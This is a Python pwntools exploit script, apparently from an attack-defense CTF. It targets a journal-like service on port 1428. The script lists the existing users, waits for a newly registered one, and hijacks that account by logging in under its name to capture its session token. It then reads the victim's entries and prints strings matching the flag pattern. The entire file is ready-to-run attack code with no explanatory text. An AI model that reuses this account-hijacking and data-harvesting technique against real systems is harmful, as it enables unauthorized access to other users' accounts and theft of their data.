#!/usr/bin/env python

import re
from pwn import *
import sys
import time

PORT = 1428
WAIT_NEW_USERS_SECS = 10 # warning: socat timeout is 20s!


def generate_string(len = 16, alph = string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join([random.choice(alph) for _ in range(len)])


def main(ip):
    r_race = remote(ip, PORT)
    r_race.recvuntil("> ")
    
    users = []
    
    r_aux = remote(ip, PORT)
    r_aux.recvuntil("> ")
    r_aux.sendline("1")
    r_aux.recvuntil("> ")
    r_aux.sendline(generate_string())
    r_aux.recvuntil("> ")
    r_aux.sendline("3")
    data = r_aux.recvuntil("Available")
    r_aux.close()
    
    for user in data.split("\n")[:-1]:
        users.append(user)
    
    time.sleep(WAIT_NEW_USERS_SECS)
    
    r_aux = remote(ip, PORT)
    r_aux.recvuntil("> ")
    r_aux.sendline("1")
    r_aux.recvuntil("> ")
    r_aux.sendline(generate_string())
    r_aux.recvuntil("> ")
    r_aux.sendline("3")
    data = r_aux.recvuntil("Available")
    r_aux.close()
    
    inject_user = ""
    for user in data.split("\n")[:-1]:
        if not user in users:
            inject_user = user
            break
    
    if inject_user == "":
        print >> sys.stderr, "Fail!"
        sys.exit(1)
    
    r_race.sendline("1")
    r_race.recvuntil("> ")
    r_race.sendline(inject_user)
    data = r_race.recvuntil("> ")
    token = re.search("token: ([A-Z0-9]+)", data).group(1)
    r_race.close()
    
    r_aux = remote(ip, PORT)
    r_aux.recvuntil("> ")
    r_aux.sendline("2")
    r_aux.recvuntil("> ")
    r_aux.sendline(token)
    r_aux.recvuntil("> ")
    r_aux.sendline("1")
    r_aux.recvuntil("> ")
    r_aux.sendline(generate_string())
    r_aux.recvuntil("> ")
    r_aux.sendline("4")
    data = r_aux.recvuntil("> ")
    
    for line in data.split("\n"):
        if line.startswith("#"):
            r_aux.sendline("2")
            r_aux.recvuntil("> ")
            r_aux.sendline(line[1:])
            data = r_aux.recvuntil("> ")
            print(''.join(re.findall("[A-Z0-9]{31}=", data)))
            sys.stdout.flush()
    r_aux.close()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("usage: nsychev_journal_my_ass.py ip")
    ip = sys.argv[1]
    
    main(ip)